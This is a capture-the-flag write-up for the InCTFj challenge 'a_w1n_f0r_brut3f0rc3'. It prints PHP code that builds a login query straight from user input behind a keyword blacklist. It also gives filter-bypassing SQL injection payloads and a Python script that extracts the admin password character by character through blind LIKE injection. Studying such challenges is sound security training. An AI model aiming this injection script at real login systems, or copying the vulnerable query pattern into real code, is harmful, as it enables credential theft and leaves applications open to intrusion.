# a_w1n_f0r_brut3f0rc3
You can get the source-code from [here](https://github.com/chsantoshkumar211/CTFs/tree/master/InCTFj/a_w1n_f0r_brut3f0rc3).

Source code : 

```PHP
<?php 
//error_reporting(0); 
include "./config.php"; 
include "./flag.php"; 

$black_list = "/admin|guest|limit|by|substr|mid|or|not|ascii|char|union|select|greatest|%00|\"|benchmark|"; 
$black_list .= "=|_|in|<|>|sqlauth|_|\.|\(\)|and|if|database|where|concat|insert|having|sleep/i"; 

if(preg_match($black_list, $_GET['pass'])) exit(":P"); 
$pass=$_GET['pass'];
$query = "select user from sqlauth where user='guest' and pw='$pass'"; 
echo "<h2>query : {$query}</h2>"; 
$result = @mysql_fetch_array(mysql_query($query)); 
$admin_info =  @mysql_fetch_array(mysql_query('select * from sqlauth where user="admin"')); 

if($result['user']) echo "<h2>Welcome {$result[user]}</h2>"; 

if($admin_info['pw']===$_GET['pass'] && $admin_info['user']==$_GET['user'] &&($admin_info['pw'])){
        echo $flag; 
        } 

highlight_file(__FILE__); 
?> 
```
On analysing the code we can understand that we have to pass the arguments as 'pass' parameter

Let's try to break the query

```
url?pass=’ || 1;%00
```
So let's put our query instead of "1" as "(pw like '%')";%00. It looks like :

```
url?pass=' || (pw like '%');%00
```

Now to get the flag we need to dump the admin password for that we are going to use regex. Here is a python script for that.

```python
import requests

#url="http://35.154.254.85/a_w1n_f0r_brut3f0rc3/?pass=' || ((pw) like \'"
url="http://localhost/inctfj/quals/a_w1n_f0r_brut3f0rc3/?pass=' || (pw like \'"
pay="1234567890"
passwd=""
while(1):
    corr=0
    for j in pay:
        query=url+passwd+j+"%\')%23"
        print(query)
        http=requests.get(query)
        if "Welcome admin" in http.text:
            passwd=passwd+j
            print(passwd)
            corr+=1
    if corr==0:
        break
print("Final pw : "+passwd)
```
On dumping the admins password and submitting the pass we get the flag :

```
inctfj{d0_u_kn0w_the_significance_0f_1729_and_6174??}
```